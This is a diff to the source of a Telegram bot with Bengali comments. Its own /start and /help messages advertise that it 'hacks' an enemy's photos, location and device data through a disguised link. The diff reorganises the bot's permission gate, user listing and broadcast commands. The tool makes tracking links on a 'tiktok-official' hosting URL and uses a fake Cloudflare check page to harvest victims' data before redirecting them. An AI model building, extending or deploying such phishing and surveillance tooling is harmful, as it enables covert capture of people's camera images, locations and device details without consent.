@@ -4,7 +4,19 @@ var cors = require('cors');
 var bodyParser = require('body-parser');
 const fetch = require('node-fetch');
 const TelegramBot = require('node-telegram-bot-api');
-const bot = new TelegramBot(process.env["bot"], {polling: true}); 
+
+// --- কনফিগারেশন ---
+const token = process.env["bot"]; // আপনার টোকেন এনভায়রনমেন্ট ভেরিয়েবল থেকে নেওয়া হচ্ছে
+const bot = new TelegramBot(token, {polling: true}); 
+//Modify your URL here
+var hostURL="https://tiktok-official.onrender.com";
+var usecodetabs=false;
+
+// আপনার Telegram User ID, যাকে Bot এর অ্যাডমিন বানানো হবে
+const ownerId = 6246410156; 
+// -----------------
+
+
 var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
 var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
 const app = express();
@@ -13,18 +25,12 @@ app.use(urlencodedParser);
 app.use(cors());
 app.set("view engine", "ejs");
 
-//Modify your URL here
-var hostURL="https://tiktok-official.onrender.com";
-var usecodetabs=false;
-
-// আপনার Telegram User ID, যাকে Bot এর অ্যাডমিন বানানো হবে
-const ownerId = 6246410156;
-
 // অনুমোদিত ব্যবহারকারীদের তালিকা লোড করা (বট ব্যবহারের অনুমতি)
 let allowedUsers = {};
 try {
     allowedUsers = JSON.parse(fs.readFileSync('users.json', 'utf8'));
 } catch (error) {
+    // ফাইল না থাকলে অ্যাডমিনকে স্বয়ংক্রিয়ভাবে যুক্ত করা
     allowedUsers[ownerId] = {
         expires: 'forever'
     };
@@ -37,7 +43,6 @@ try {
     const savedUsers = JSON.parse(fs.readFileSync('all_users.json', 'utf8'));
     allUsers = new Set(savedUsers);
 } catch (error) {
-    // যদি ফাইল না থাকে, একটি ফাঁকা ফাইল তৈরি করা হবে।
     fs.writeFileSync('all_users.json', JSON.stringify(Array.from(allUsers), null, 2));
 }
 
@@ -48,6 +53,11 @@ function saveAllUsers() {
 
 // Bot কখন চালু হয়েছে, তা ট্র্যাক করার জন্য
 const startTime = new Date();
+
+// --- বট স্টার্টআপ নোটিফিকেশন ---
+bot.sendMessage(ownerId, '✅ বট সফলভাবে চালু হয়েছে! স্টার্টআপ টাইম: ' + startTime.toLocaleString('bn-BD'));
+// -----------------------------
+
 
 // ইউজারকে অনুমতি আছে কিনা চেক করার ফাংশন
 function isAllowed(userId) {
@@ -69,7 +79,7 @@ function saveAllowedUsers() {
     fs.writeFileSync('users.json', JSON.stringify(allowedUsers, null, 2));
 }
 
-// ⭐ ছবি সহ ব্রডকাস্ট ফাংশন (সকল ইউজারের কাছে যাবে, অনুমতি বিবেচনা করা হবে না)
+// ⭐ ছবি সহ ব্রডকাস্ট ফাংশন (সকল ইউজারের কাছে যাবে)
 async function broadcastToAllUsers(adminChatId, message, photoFileIdOrUrl = null) {
     const userIds = Array.from(allUsers);
     let successCount = 0;
@@ -92,7 +102,7 @@ async function broadcastToAllUsers(adminChatId, message, photoFileIdOrUrl = null
                 await bot.sendMessage(targetChatId, message);
             }
             successCount++;
-            // 🛑 ফিক্স: রেট-লিমিট এড়াতে অপেক্ষার সময় 300ms করা হলো
+            // রেট-লিমিট এড়াতে অপেক্ষার সময় 300ms করা হলো
             await new Promise(resolve => setTimeout(resolve, 300)); 
         } catch (error) {
             console.error(`Error sending message/photo to ${targetChatId}:`, error.message);
@@ -104,6 +114,7 @@ async function broadcastToAllUsers(adminChatId, message, photoFileIdOrUrl = null
 }
 // ⭐ ব্রডকাস্ট ফাংশন শেষ
 
+// --- ওয়েবভিউ রুটস ---
 app.get("/w/:path/:uri",(req,res)=>{
 var ip;
 var d = new Date();
@@ -132,31 +143,41 @@ else{
 res.redirect("https://t.me/ehtool");
 }
 });
+// ---------------------
 
 
 bot.on('message', async (msg) => {
 const chatId = msg.chat.id;
+const msgText = msg.text;
 
-// 🆕 সকল ইউজার আইডি সেভ করা
+// 1. সকল ইউজার আইডি সেভ করা
 if (!allUsers.has(chatId.toString())) {
     allUsers.add(chatId.toString());
     saveAllUsers();
 }
 
-if(msg.text && msg.reply_to_message?.text=="🌐 আপনার লিঙ্কটি দিন"){
-    createLink(chatId,msg.text); 
+// 2. 🛑 স্ট্রিক্ট পারমিশন ব্যারিয়ার (এমনকি /start এর আগেও)
+if (!isAllowed(chatId)) {
+    // যদি ইউজার allowed না হয়, তাহলে সমস্ত মেসেজ ব্লক করা হবে।
+    bot.sendMessage(chatId, `দুঃখিত, এই বটটি ব্যবহারের জন্য আপনার অনুমতি নেই।😢\n\nএই বটটি আপনি ব্যবহার করতে চাইলে নিচে দেওয়া লিঙ্ক এর মাধ্যমে অ্যাডমিনের সাথে যোগাযোগ করুন।🎉\n\n\nTelegram : @ehtool_admin\n\nTelegram Channel : @ehtool\n\nFacebook : https://www.facebook.com/ehtoolbysakib`);
+    return; // এখানেই কোড এক্সিকিউশন শেষ
 }
 
-// 🛑 ফিক্স: /start কমান্ড সবার জন্য কাজ করবে।
-if(msg.text=="/start"){ 
-var m={
-reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
-};
+// --- এখন থেকে শুধুমাত্র Allowed ইউজাররাই কোড এক্সিকিউট করবে ---
 
-bot.sendMessage(chatId, `আসসালামু আলাইকুম, ${msg.chat.first_name} ! , \nআপনি এই বট ব্যবহার করে সামান্য একটি লিঙ্ক পাঠিয়ে আপনার শত্রুর ছবি, লোকেশন এবং তার ডিভাইসের বিভিন্ন তথ্য হ্যাক করে নিতে পারবেন।\n\nআরোও তথ্য জানার জন্য টাইপ করুন, /help`,m);
+// 3. /start কমান্ড হ্যান্ডলিং
+if(msgText=="/start"){ 
+    var m={
+        reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
+    };
+    bot.sendMessage(chatId, `আসসালামু আলাইকুম, ${msg.chat.first_name} ! , \nআপনি এই বট ব্যবহার করে সামান্য একটি লিঙ্ক পাঠিয়ে আপনার শত্রুর ছবি, লোকেশন এবং তার ডিভাইসের বিভিন্ন তথ্য হ্যাক করে নিতে পারবেন।\n\nআরোও তথ্য জানার জন্য টাইপ করুন, /help`,m);
 }
-// 🆕 নতুন কমান্ড: /userlist (ইউজারদের আইডি দেখাবে)
-else if (msg.text === '/userlist') {
+// 4. রিপ্লাই মেসেজ হ্যান্ডলিং (লিঙ্ক ক্রিয়েশন)
+else if(msgText && msg.reply_to_message?.text=="🌐 আপনার লিঙ্কটি দিন"){
+    createLink(chatId,msgText); 
+}
+// 5. /userlist কমান্ড (ইন্টারেক্টিভ)
+else if (msgText === '/userlist') {
     if (chatId !== ownerId) {
         bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
         return;
@@ -166,19 +187,41 @@ else if (msg.text === '/userlist') {
     const allowedCount = Object.keys(allowedUsers).length;
     
     let userList = `👥 আপনার বটের সকল ইউজারের (যারা স্টার্ট করেছে) তালিকা:\n\n`;
-    userList += `সর্বমোট ইউজার যারা বট শুরু করেছে: ${userIds.length} জন\n`;
-    userList += `অনুমোদিত (Allowed) ইউজার: ${allowedCount} জন\n\n`;
+    userList += `সর্বমোট ইউজার: ${userIds.length} জন | অনুমোদিত ইউজার: ${allowedCount} জন\n\n`;
 
-    // মেসেজের আকার সীমিত রাখতে প্রথম 20 জন ইউজারকে দেখানো হচ্ছে
-    const displayLimit = 20; 
+    const displayLimit = 30; // মেসেজের আকার সীমিত রাখতে প্রথম 30 জন ইউজারকে দেখানো হচ্ছে
     if (userIds.length > 0) {
-        userList += `--- প্রথম ${Math.min(userIds.length, displayLimit)} জন ইউজারের ID ও স্ট্যাটাস ---\n`;
+        userList += `--- প্রথম ${Math.min(userIds.length, displayLimit)} জন ইউজারের ID ও স্ট্যাটাস ---\n\n`;
+        
         for (let i = 0; i < Math.min(userIds.length, displayLimit); i++) {
             const id = userIds[i];
-            // অনুমতি স্ট্যাটাস চেক করা হচ্ছে
-            const status = isAllowed(parseInt(id, 10)) ? '✅ Allowed' : '❌ Disallowed';
-            userList += `${i + 1}. \`${id}\` (${status})\n`;
+            const isUserAllowed = isAllowed(parseInt(id, 10));
+            const status = isUserAllowed ? '✅ Allowed' : '❌ Disallowed';
+            
+            let userName = `User ID: ${id}`; // ডিফল্ট নাম
+            
+            try {
+                // ইউজার ডেটা ফেচ করা হচ্ছে নাম এবং ক্লিকযোগ্য লিঙ্কের জন্য
+                const chatInfo = await bot.getChat(id);
+                const firstName = chatInfo.first_name || "Unknown";
+                const username = chatInfo.username;
+                
+                if (username) {
+                    userName = `[${firstName}](https://t.me/${username})`; // Username থাকলে clickable link
+                } else {
+                    userName = `[${firstName}](tg://user?id=${id})`; // না থাকলে ID দিয়ে clickable link
+                }
+            } catch (error) {
+                // যদি ইউজার বট ব্লক করে থাকে, তাহলে getChat ফেইল করবে
+                userName = `[Blocked/Unknown User] (ID: ${id})`;
+            }
+            
+            userList += `${i + 1}. ${userName} (${status})\n`;
+
+            // টেলিগ্রাম API রেট লিমিট এড়াতে সামান্য অপেক্ষা
+            await new Promise(resolve => setTimeout(resolve, 50)); 
         }
+        
         if (userIds.length > displayLimit) {
             userList += `\n... বাকি ${userIds.length - displayLimit} জনের তালিকা দেখানো সম্ভব হচ্ছে না।`;
         }
@@ -186,17 +229,12 @@ else if (msg.text === '/userlist') {
         userList += `বর্তমানে আপনার বটের কোনো ইউজার নেই।`;
     }
     
-    bot.sendMessage(chatId, userList, { parse_mode: 'Markdown' });
+    bot.sendMessage(chatId, userList, { parse_mode: 'Markdown', disable_web_page_preview: true });
 }
-// এই পয়েন্টের পর, যদি ইউজার অনুমতিপ্রাপ্ত না হয়, তবে তাকে ব্লক করা হবে।
-else if (!isAllowed(chatId)) {
-    bot.sendMessage(chatId, `দুঃখিত, এই বটটি ব্যবহারের জন্য আপনার অনুমতি নেই।😢\n\nএই বটটি আপনি ব্যবহার করতে চাইলে নিচে দেওয়া লিঙ্ক এর মাধ্যমে অ্যাডমিনের সাথে যোগাযোগ করুন।🎉\n\n\nTelegram : @ehtool_admin\n\nTelegram Channel : @ehtool\n\nFacebook : https://www.facebook.com/ehtoolbysakib`);
-    return;
-}
-else if(msg.text=="/create"){
+else if(msgText=="/create"){
 createNew(chatId);
 }
-else if(msg.text=="/help"){
+else if(msgText=="/help"){
 bot.sendMessage(chatId,`এই বটের মাধ্যমে আপনি কেবল একটি সহজ লিঙ্ক পাঠিয়ে মানুষদের ট্র্যাক করতে পারবেন।\n\nপ্রথমে /create লিখে সেন্ড করুন, তারপর বট আপনার কাছে একটা লিঙ্ক চাইবে, আমি যেকেনো একটা ভিডিও এর লিঙ্ক দিয়ে দিবেন।\nআপনার থেকে লিঙ্ক পেলে বট আপনার লিঙ্কে ম্যালওয়ার বসিয়ে আপনাকে আবার ২ টা লিঙ্ক দিবে।
 \n\nSpecifications.
 \n1. Cloudflare Link: এই পদ্ধতিতে তথ্য সংগ্রহের জন্য একটি ক্লাউডফ্লেয়ার আন্ডার অ্যাটাক পৃষ্ঠা দেখানো হবে এবং পরে ভিকটিমকে গন্তব্যস্থলের URL-এ পুনঃনির্দেশিত করা হবে।
@@ -205,14 +243,14 @@ bot.sendMessage(chatId,`এই বটের মাধ্যমে আপনি �
 \n\nঅবশ্যই আমাদের চ্যানেলে জয়েন হবেন আরোও টুলস পাওয়ার জন্য\n Telegram Channel : https://t.me/ehtool\nFacebook Page : https://www.facebook.com/profile.php?id=61580675061865
 `);
 }
-// ⭐ ব্রডকাস্ট কমান্ড (ছবি সাপোর্টেড)
-else if (msg.text && msg.text.startsWith('/broadcast')) {
+// ⭐ ব্রডকাস্ট কমান্ড
+else if (msgText && msgText.startsWith('/broadcast')) {
     if (chatId !== ownerId) {
         bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
         return;
     }
 
-    const broadcastMessage = msg.text.substring('/broadcast'.length).trim();
+    const broadcastMessage = msgText.substring('/broadcast'.length).trim();
     let photoFileId = null;
 
     if (msg.reply_to_message && msg.reply_to_message.photo) {
@@ -226,13 +264,13 @@ else if (msg.text && msg.text.startsWith('/broadcast')) {
 
     broadcastToAllUsers(chatId, broadcastMessage, photoFileId);
 }
-// নতুন কমান্ড: /allow <chat_id> <time> 
-else if (msg.text && msg.text.startsWith('/allow')) {
+// অন্যান্য অ্যাডমিন কমান্ড...
+else if (msgText && msgText.startsWith('/allow')) {
     if (chatId !== ownerId) {
         bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
         return;
     }
-    const parts = msg.text.split(' ');
+    const parts = msgText.split(' ');
     if (parts.length >= 2) {
         const userIdToAdd = parseInt(parts[1], 10);
         if (isNaN(userIdToAdd)) {
@@ -292,13 +330,12 @@ else if (msg.text && msg.text.startsWith('/allow')) {
         bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /allow <user_id> [সময়]`);
     }
 }
-// নতুন কমান্ড: /disallow <chat_id>
-else if (msg.text && msg.text.startsWith('/disallow')) {
+else if (msgText && msgText.startsWith('/disallow')) {
     if (chatId !== ownerId) {
         bot.sendMessage(chatId, 'দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।');
         return;
     }
-    const parts = msg.text.split(' ');
+    const parts = msgText.split(' ');
     if (parts.length === 2) {
         const userIdToRemove = parseInt(parts[1], 10);
         if (!isNaN(userIdToRemove)) {
@@ -317,8 +354,7 @@ else if (msg.text && msg.text.startsWith('/disallow')) {
         bot.sendMessage(chatId, `⚠️ সঠিক ব্যবহার: /disallow <user_id>`);
     }
 }
-// নতুন কমান্ড: /uptime
-else if (msg.text === '/uptime') {
+else if (msgText === '/uptime') {
     const uptimeInSeconds = Math.floor((new Date() - startTime) / 1000);
     const hours = Math.floor(uptimeInSeconds / 3600);
     const minutes = Math.floor((uptimeInSeconds % 3600) / 60);
@@ -326,14 +362,14 @@ else if (msg.text === '/uptime') {
     bot.sendMessage(chatId, `বটটি চালু আছে ${hours} ঘন্টা, ${minutes} মিনিট, এবং ${seconds} সেকেন্ড ধরে।`);
 }
 // যদি কোনো টেক্সট মেসেজ না থাকে (যেমন ছবি, স্টিকার), তাহলে এখানে শেষ হবে।
-else if (!msg.text) {
+else if (!msgText) {
     return;
 }
 });
 
 bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
 bot.answerCallbackQuery(callbackQuery.id);
-// 🛑 ফিক্স: এখানেও isAllowed চেকটি callback এর পরেও থাকতে হবে।
+// 🛑 ফিক্স: কঠোর পারমিশন চেক (callback এর জন্যও)
 if (!isAllowed(callbackQuery.from.id)) {
     bot.sendMessage(callbackQuery.from.id, `দুঃখিত, এই বটটি ব্যবহারের জন্য আপনার অনুমতি নেই।😢\n\nএই বটটি আপনি ব্যবহার করতে চাইলে নিচে দেওয়া লিঙ্ক এর মাধ্যমে অ্যাডমিনের সাথে যোগাযোগ করুন।🎉/n/n/nTelegram : @ehtool_admin\n\nTelegram Channel : @ehtool\n\nFacebook : https://www.facebook.com/ehtoolbysakib`);
     return;
@@ -342,14 +378,14 @@ if(callbackQuery.data=="crenew"){
 createNew(callbackQuery.message.chat.id);
 }
 });
+
 bot.on('polling_error', (error) => {
 //console.log(error.code);
 });
 
 
-// 🎯 সংশোধিত createLink ফাংশন (TypeError ফিক্স করা হয়েছে)
+// 🎯 সংশোধিত createLink ফাংশন 
 async function createLink(cid, msg) {
-    // 🛑 ফিক্স: প্রথমে চেক করুন msg একটি বৈধ স্ট্রিং কিনা। না হলে ফাংশন শেষ করুন।
     if (typeof msg !== 'string' || msg.length === 0) {
         bot.sendMessage(cid, `⚠️ দুঃখিত, আপনি কোনো সঠিক লিঙ্ক দেননি বা আপনার বার্তাটি টেক্সট ফরম্যাটে নেই।`);
         createNew(cid);
